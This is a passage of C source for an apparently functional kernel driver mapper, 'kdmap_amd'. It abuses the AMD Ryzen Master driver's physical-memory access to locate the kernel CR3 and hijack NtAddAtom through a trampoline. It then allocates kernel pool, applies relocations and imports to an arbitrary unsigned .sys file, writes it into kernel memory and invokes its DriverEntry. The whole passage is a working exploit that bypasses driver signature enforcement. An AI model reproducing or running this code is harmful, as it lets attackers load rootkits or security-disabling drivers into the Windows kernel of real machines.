 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

#define POOL_TAG  0x45747742u  /* 'BwtE' little-endian */
#define NonPagedPool 0

static uint64_t alloc_pool(uint64_t size)
{
    static uint64_t fn_ExAllocate = 0;
    if (!fn_ExAllocate) {
        fn_ExAllocate = get_kernel_export(g_ntoskrnl_va, "ExAllocatePoolWithTag");
        if (!fn_ExAllocate) {
            /* Newer builds may expose ExAllocatePool2 (POOL_FLAG_NON_PAGED=0x40) */
            fn_ExAllocate = get_kernel_export(g_ntoskrnl_va, "ExAllocatePool2");
            if (fn_ExAllocate) {
                printf("[*] Using ExAllocatePool2 (POOL_FLAG_NON_PAGED)\n");
                return call_kernel_fn(fn_ExAllocate, 0x40 /*NON_PAGED*/, size, POOL_TAG, 0);
            }
            printf("[-] ExAllocatePoolWithTag / ExAllocatePool2 not found\n");
            return 0;
        }
    }
    return call_kernel_fn(fn_ExAllocate, NonPagedPool, size, POOL_TAG, 0);
}

static int free_pool(uint64_t addr)
{
    static uint64_t fn_ExFree = 0;
    if (!fn_ExFree)
        fn_ExFree = get_kernel_export(g_ntoskrnl_va, "ExFreePool");
    if (!fn_ExFree) return 0;
    call_kernel_fn(fn_ExFree, addr, 0, 0, 0);
    return 1;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§8  PE MANIPULATION  (userland copy â€” no kernel access needed here)
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

/* Apply base relocations.  delta = actual_load_va - preferred_va. */
static void pe_apply_relocs(uint8_t *image, uint64_t delta)
{
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);

    DWORD reloc_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
    DWORD reloc_sz  = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;
    if (!reloc_rva || !reloc_sz) { printf("[!] No relocations â€” driver may crash if ASLR differs\n"); return; }

    IMAGE_BASE_RELOCATION *blk = (IMAGE_BASE_RELOCATION*)(image + reloc_rva);
    IMAGE_BASE_RELOCATION *end = (IMAGE_BASE_RELOCATION*)(image + reloc_rva + reloc_sz);

    uint32_t fixed = 0;
    while (blk < end && blk->SizeOfBlock) {
        uint8_t  *page = image + blk->VirtualAddress;
        uint16_t *item = (uint16_t*)((uint8_t*)blk + sizeof(IMAGE_BASE_RELOCATION));
        uint32_t  cnt  = (blk->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / 2;
        for (uint32_t i = 0; i < cnt; i++) {
            uint16_t type = item[i] >> 12, off = item[i] & 0xFFF;
            if (type == 10 /*IMAGE_REL_BASED_DIR64*/)
                { *(uint64_t*)(page + off) += delta; fixed++; }
        }
        blk = (IMAGE_BASE_RELOCATION*)((uint8_t*)blk + blk->SizeOfBlock);
    }
    printf("[*] Relocations applied: %u entries, delta=0x%llX\n",
           fixed, (unsigned long long)delta);
}

/* Resolve all imports against live kernel modules.
 * Fills in the IAT (FirstThunk array) in the userland image copy. */
static int pe_resolve_imports(uint8_t *image)
{
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);

    DWORD imp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;
    if (!imp_rva) { printf("[*] No imports\n"); return 1; }

    IMAGE_IMPORT_DESCRIPTOR *imp = (IMAGE_IMPORT_DESCRIPTOR*)(image + imp_rva);
    int all_ok = 1;

    while (imp->FirstThunk) {
        char *mod_name = (char*)(image + imp->Name);

        /* Locate the kernel module */
        uint64_t mod_kva = 0;
        if (_stricmp(mod_name, "ntoskrnl.exe") == 0 ||
            _stricmp(mod_name, "ntkrnlmp.exe") == 0 ||
            _stricmp(mod_name, "ntkrpamp.exe") == 0) {
            mod_kva = g_ntoskrnl_va;
        } else {
            mod_kva = get_kernel_module_base(mod_name);
            if (!mod_kva)
                printf("[!] Module not loaded: %s â€” will try ntoskrnl fallback\n", mod_name);
        }

        /* OriginalFirstThunk may be 0 in bound/compressed imports; fall back to FirstThunk */
        DWORD hint_rva = imp->OriginalFirstThunk ? imp->OriginalFirstThunk : imp->FirstThunk;
        IMAGE_THUNK_DATA64 *orig  = (IMAGE_THUNK_DATA64*)(image + hint_rva);
        IMAGE_THUNK_DATA64 *thunk = (IMAGE_THUNK_DATA64*)(image + imp->FirstThunk);

        while (orig->u1.Function) {
            /* IMAGE_ORDINAL_FLAG64: high bit set = import by ordinal, no name */
            if (orig->u1.Ordinal & (1ULL << 63)) {
                printf("    [!] %s!ord#%llu â€” by-ordinal imports not supported\n",
                       mod_name, (unsigned long long)(orig->u1.Ordinal & 0xFFFF));
                orig++; thunk++;
                continue;
            }
            IMAGE_IMPORT_BY_NAME *by_name =
                (IMAGE_IMPORT_BY_NAME*)(image + orig->u1.AddressOfData);
            const char *fn_name = by_name->Name;

            uint64_t fn_kva = 0;
            if (mod_kva)
                fn_kva = get_kernel_export(mod_kva, fn_name);
            /* Fallback: ntoskrnl re-exports many HAL + other routines */
            if (!fn_kva && mod_kva != g_ntoskrnl_va)
                fn_kva = get_kernel_export(g_ntoskrnl_va, fn_name);

            if (!fn_kva) {
                printf("[-] Unresolved import: %s!%s\n", mod_name, fn_name);
                all_ok = 0;
            } else {
                printf("    [+] %s!%s â†’ 0x%llX\n",
                       mod_name, fn_name, (unsigned long long)fn_kva);
                thunk->u1.Function = fn_kva;
            }
            orig++; thunk++;
        }
        imp++;
    }
    return all_ok;
}

/* Fix __security_cookie (same formula as kdmapper) */
static void pe_fix_security_cookie(uint8_t *image, uint64_t pool_kva)
{
    IMAGE_DOS_HEADER   *dos = (IMAGE_DOS_HEADER*)image;
    IMAGE_NT_HEADERS64 *nt  = (IMAGE_NT_HEADERS64*)(image + dos->e_lfanew);
    DWORD cfg_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_LOAD_CONFIG].VirtualAddress;
    if (!cfg_rva) return;

    typedef struct {
        DWORD Size; DWORD TimeDateStamp;
        WORD  MajorVersion, MinorVersion;
        DWORD GlobalFlagsClear, GlobalFlagsSet, CriticalSectionDefaultTimeout;
        ULONGLONG DeCommitFreeBlockThreshold, DeCommitTotalFreeThreshold;
        ULONGLONG LockPrefixTable, MaximumAllocationSize, VirtualMemoryThreshold;
        ULONGLONG ProcessAffinityMask; DWORD ProcessHeapFlags, CSDVersion;
        WORD DependentLoadFlags; ULONGLONG EditList, SecurityCookie;
    } LC64;

    LC64 *lc = (LC64*)(image + cfg_rva);
    if (!lc->SecurityCookie) return;

    /* SecurityCookie field holds RVA in the userland copy; patch to kernel VA */
    uint64_t cookie_rva = lc->SecurityCookie - nt->OptionalHeader.ImageBase;
    if (cookie_rva >= nt->OptionalHeader.SizeOfImage) return;

    uint64_t *cookie_ptr = (uint64_t*)(image + cookie_rva);
    /* Standard security cookie init (kdmapper formula) */
    *cookie_ptr = 0x2B992DDFA232ULL ^
                  (uint64_t)GetCurrentProcessId() ^
                  (uint64_t)GetCurrentThreadId() ^
                  (uint64_t)(uintptr_t)image ^
                  pool_kva;
    printf("[*] Security cookie patched\n");
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§9  MAP DRIVER  (full reflective loader)
 *
 * Steps (mirrors kdmapper::MapDriver):
 *   1. Read .sys from disk
 *   2. ExAllocatePoolWithTag(NonPagedPool, SizeOfImage)
 *   3. Copy PE headers + sections to userland staging buffer
 *   4. Apply relocations (delta = pool_kva - preferred_base)
 *   5. Fix security cookie
 *   6. Resolve imports â†’ fill IAT with live kernel VAs
 *   7. kernel_write(pool_kva, staged, image_size)  â€” write to NonPagedPool
 *   8. call_kernel_fn(pool_kva + EntryPoint_RVA, 0, 0)  â€” invoke DriverEntry
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

uint64_t map_driver(const char *path, int free_after)
{
    printf("\n[*] Loading: %s\n", path);

    /* --- 1. Read file --- */
    HANDLE hf = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open file: err=%lu\n", GetLastError()); return 0;
    }
    DWORD file_sz = GetFileSize(hf, NULL);
    uint8_t *file_buf = (uint8_t*)malloc(file_sz);
    DWORD rd = 0; ReadFile(hf, file_buf, file_sz, &rd, NULL); CloseHandle(hf);
    printf("[+] Read %lu bytes\n", (unsigned long)file_sz);

    /* --- 2. Parse PE --- */
    IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER*)file_buf;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Not a PE file\n"); free(file_buf); return 0;
    }
    IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64*)(file_buf + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE ||
        nt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        printf("[-] Not a 64-bit PE\n"); free(file_buf); return 0;
    }
    DWORD image_sz       = nt->OptionalHeader.SizeOfImage;
    DWORD header_sz      = nt->OptionalHeader.SizeOfHeaders;
    uint64_t preferred   = nt->OptionalHeader.ImageBase;
    DWORD    entry_rva   = nt->OptionalHeader.AddressOfEntryPoint;
    printf("[*] SizeOfImage=0x%lX  EntryRVA=0x%lX  PreferredBase=0x%llX\n",
           (unsigned long)image_sz, (unsigned long)entry_rva,
           (unsigned long long)preferred);

    /* --- 3. Allocate NonPagedPool --- */
    printf("[*] Allocating kernel pool (0x%lX bytes)...\n", (unsigned long)image_sz);
    uint64_t pool_kva = alloc_pool(image_sz);
    if (!pool_kva) {
        printf("[-] ExAllocatePoolWithTag failed (returned NULL)\n");
        free(file_buf); return 0;
    }
    printf("[+] Pool allocated at kva=0x%llX\n", (unsigned long long)pool_kva);

    /* --- 4. Build staged image in userland --- */
    uint8_t *staged = (uint8_t*)calloc(1, image_sz);
    if (!staged) { free(file_buf); return 0; }

    /* Copy PE headers */
    memcpy(staged, file_buf, header_sz);

    /* Copy sections */
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (!sec[i].VirtualAddress || !sec[i].SizeOfRawData) continue;
        DWORD voff = sec[i].VirtualAddress;
        DWORD roff = sec[i].PointerToRawData;
        DWORD rsz  = sec[i].SizeOfRawData;
        if (voff + rsz > image_sz || roff + rsz > file_sz) continue;
        memcpy(staged + voff, file_buf + roff, rsz);
        printf("[*] Section %-8.8s  RVA=0x%08lX  size=0x%lX\n",
               sec[i].Name, (unsigned long)voff, (unsigned long)rsz);
    }
    free(file_buf);

    /* --- 5. Apply relocations --- */
    uint64_t delta = pool_kva - preferred;
    if (delta) pe_apply_relocs(staged, delta);

    /* --- 6. Fix security cookie --- */
    pe_fix_security_cookie(staged, pool_kva);

    /* --- 7. Resolve imports --- */
    printf("[*] Resolving imports...\n");
    if (!pe_resolve_imports(staged)) {
        printf("[!] Some imports unresolved â€” driver may crash\n");
    }

    /* --- 8. Write staged image to kernel pool --- */
    printf("[*] Writing driver image to kernel pool...\n");
    if (!kernel_write(pool_kva, staged, image_sz)) {
        printf("[-] kernel_write failed\n");
        free(staged); free_pool(pool_kva); return 0;
    }
    free(staged);
    printf("[+] Driver image written to 0x%llX\n", (unsigned long long)pool_kva);

    /* --- 9. Call DriverEntry --- */
    uint64_t entry_kva = pool_kva + entry_rva;
    printf("[*] Calling DriverEntry at kva=0x%llX...\n", (unsigned long long)entry_kva);
    uint64_t status = call_kernel_fn(entry_kva, 0 /*DriverObject*/, 0 /*RegistryPath*/, 0, 0);
    printf("[%s] DriverEntry returned NTSTATUS=0x%llX\n",
           (status == 0 || status == 0x00000001) ? "+" : "!",
           (unsigned long long)status);

    if (free_after) {
        free_pool(pool_kva);
        printf("[*] Pool freed\n");
        return 0;
    }
    return pool_kva;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§10  SETUP  (find ntoskrnl, read disk PE, find CR3)
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

static int setup(void)
{
    /* Find ntoskrnl runtime VA */
    MOD_LIST *ml = get_module_list();
    if (!ml) { printf("[-] NtQuerySystemInformation failed\n"); return 0; }
    g_ntoskrnl_va = (uint64_t)ml->Modules[0].ImageBase;
    DWORD nt_size = ml->Modules[0].ImageSize;
    printf("[+] ntoskrnl VA=0x%llX  size=0x%lX\n",
           (unsigned long long)g_ntoskrnl_va, (unsigned long)nt_size);

    /* Build disk path from module list (e.g. \SystemRoot\system32\ntoskrnl.exe) */
    char nt_path[MAX_PATH];
    const char *fn = ml->Modules[0].FullPathName + ml->Modules[0].OffsetToFileName;
    char sysdir[MAX_PATH]; GetSystemDirectoryA(sysdir, sizeof sysdir);
    snprintf(nt_path, sizeof nt_path, "%s\\%s", sysdir, fn);
    if (GetFileAttributesA(nt_path) == INVALID_FILE_ATTRIBUTES)
        snprintf(nt_path, sizeof nt_path, "%s\\ntoskrnl.exe", sysdir);
    free(ml);

    /* Read ntoskrnl from disk for fast export RVA lookup */
    HANDLE hf = CreateFileA(nt_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        printf("[!] Cannot open %s â€” live export walk will be used\n", nt_path);
    } else {
        g_ntoskrnl_pe_sz = GetFileSize(hf, NULL);
        g_ntoskrnl_pe    = (uint8_t*)malloc(g_ntoskrnl_pe_sz);
        DWORD rd = 0; ReadFile(hf, g_ntoskrnl_pe, g_ntoskrnl_pe_sz, &rd, NULL);
        CloseHandle(hf);
        printf("[+] ntoskrnl disk: %lu bytes\n", (unsigned long)g_ntoskrnl_pe_sz);
    }

    /* Find ntoskrnl PA first (needed to verify the CR3) */
    printf("[*] Scanning for ntoskrnl PA...\n");
    uint64_t nt_pa = find_ntoskrnl_pa();
    if (!nt_pa) { printf("[-] ntoskrnl PA not found\n"); return 0; }

    /* Find actual kernel CR3 â€” verified against ntoskrnl VAâ†’PA mapping */
    printf("[*] Finding kernel CR3 (verified)...\n");
    g_kernel_cr3 = find_kernel_cr3_verified(g_ntoskrnl_va, nt_pa);
    if (!g_kernel_cr3) {
        printf("[!] Verified CR3 not found, trying self-reference fallback...\n");
        g_kernel_cr3 = find_kernel_cr3();
        if (!g_kernel_cr3) { printf("[-] Kernel CR3 not found\n"); return 0; }
        printf("[+] Kernel CR3=0x%llX (self-ref, may be wrong)\n", (unsigned long long)g_kernel_cr3);
    }

    /* Verify va_to_pa is now consistent */
    uint64_t nt_pa_check = va_to_pa(g_ntoskrnl_va);
    if (!nt_pa_check) {
        printf("[-] va_to_pa(ntoskrnl) still failed â€” CR3 wrong\n"); return 0;
    }
    if (nt_pa_check != nt_pa) {
        printf("[!] PA mismatch: scan=0x%llX va_to_pa=0x%llX (using scan value)\n",
               (unsigned long long)nt_pa, (unsigned long long)nt_pa_check);
    }
    printf("[+] ntoskrnl PA=0x%llX  va_to_pa consistent\n", (unsigned long long)nt_pa);

    return 1;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Â§11  MAIN
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */

int main(int argc, char **argv)
{
    SetConsoleOutputCP(CP_UTF8);
    setvbuf(stdout, NULL, _IONBF, 0); /* unbuffered â€” no lost output on crash */
    /* Enable VT escape sequences */
    {HANDLE h=GetStdHandle(STD_OUTPUT_HANDLE);DWORD m=0;
     if(GetConsoleMode(h,&m)) SetConsoleMode(h,m|0x0004);}

    printf("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—\n");
    printf("â•‘          kdmap_amd â€” Driver Loader (AMD Ryzen Master)    â•‘\n");
    printf("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n\n");

    if (argc < 2) {
        printf("Usage: %s <driver.sys> [--free]\n", argv[0]);
        printf("  --free : free pool memory after DriverEntry returns\n");
        return 1;
    }

    const char *driver_path = argv[1];
    int free_after = (argc >= 3 && strcmp(argv[2], "--free") == 0);

    /* Open AMD driver */
    g_dev = CreateFileW(DEVICE_NAME, GENERIC_READ|GENERIC_WRITE,
                        FILE_SHARE_READ|FILE_SHARE_WRITE,
                        NULL, OPEN_EXISTING, 0, NULL);
    if (g_dev == INVALID_HANDLE_VALUE) {
        printf("[-] Cannot open AMDRyzenMasterDriverV20: err=%lu\n", GetLastError());
        return 1;
    }
    printf("[+] AMD driver opened\n");

    /* Physical ranges */
    load_ranges();
    printf("[+] Physical ranges: %d\n", g_nranges);
    if (!g_nranges) { printf("[-] No physical ranges\n"); return 1; }

    /* Kernel setup */
    if (!setup()) { CloseHandle(g_dev); return 1; }

    /* Self-test: verify the trampoline mechanism actually works.
     * ExGetPreviousMode reads KTHREAD.PreviousMode.  Called via NtAddAtom syscall
     * from userland â†’ PreviousMode = 1 (UserMode).  Any other value means the
     * trampoline didn't fire (HVCI, wrong CR3, patched NtAddAtom already, etc.). */
    printf("\n[*] Self-test: NtAddAtom trampoline â†’ ExGetPreviousMode (expect 1=UserMode)...\n");
    {
        uint64_t fn = get_kernel_export(g_ntoskrnl_va, "ExGetPreviousMode");
        if (fn) {
            uint64_t mode = call_kernel_fn(fn, 0, 0, 0, 0);
            if (mode == 1) {
                printf("    [+] ExGetPreviousMode â†’ 1 (UserMode) â€” trampoline OK\n");
            } else {
                printf("    [-] ExGetPreviousMode â†’ 0x%llX (expected 1) â€” trampoline BROKEN\n",
                       (unsigned long long)mode);
                printf("    Aborting: continuing would BSOD writing corrupt data.\n");
                if (g_ntoskrnl_pe) free(g_ntoskrnl_pe);
                CloseHandle(g_dev);
                return 1;
            }
        } else {
            printf("    [!] ExGetPreviousMode not found â€” skipping self-test (risky)\n");
        }
    }

    /* Load driver */
    printf("\n");
    uint64_t loaded = map_driver(driver_path, free_after);
    if (loaded) {
        printf("\n[+] Driver loaded at kernel pool VA=0x%llX\n",
               (unsigned long long)loaded);
        printf("    Pool remains allocated â€” driver stays active.\n");
        printf("    Reboot to unload.\n");
    } else if (free_after) {
        printf("\n[+] Driver executed and pool freed.\n");
    } else {
        printf("\n[-] Driver load failed.\n");
    }

    if (g_ntoskrnl_pe) free(g_ntoskrnl_pe);
    CloseHandle(g_dev);
    return loaded || free_after ? 0 : 1;
}
